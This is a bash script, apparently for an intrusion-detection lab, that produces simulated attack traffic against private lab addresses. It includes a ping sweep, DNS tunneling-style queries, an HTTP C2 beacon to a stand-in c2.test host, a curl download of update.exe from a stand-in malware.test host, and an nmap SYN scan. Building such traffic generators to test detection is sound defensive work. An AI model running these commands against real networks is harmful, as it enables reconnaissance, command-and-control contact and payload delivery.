#!/bin/bash
set -euo pipefail

# Run these from the host with docker exec, or copy/paste inside attacker.
# Example:
#   docker exec -it vigilan-lab-attacker bash

echo "Ping victim"
ping -c 3 10.78.0.10

echo "HTTP request to malicious web"
curl -I http://172.29.0.80

echo "DNS query to fake domain"
dig @172.29.0.53 bad.test

echo "DNS tunneling style query"
label=$(head -c 32 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 32)
dig @172.29.0.53 ${label}.bad.test

echo "C2 beacon (HTTP)"
curl -s -H "Host: c2.test" http://172.29.0.80/c2/beacon >/dev/null

echo "Malware download"
curl -s -H "Host: malware.test" http://172.29.0.80/download/update.exe -o /tmp/update.exe

echo "Basic port scan"
nmap -sS -p 22,80 10.78.0.10
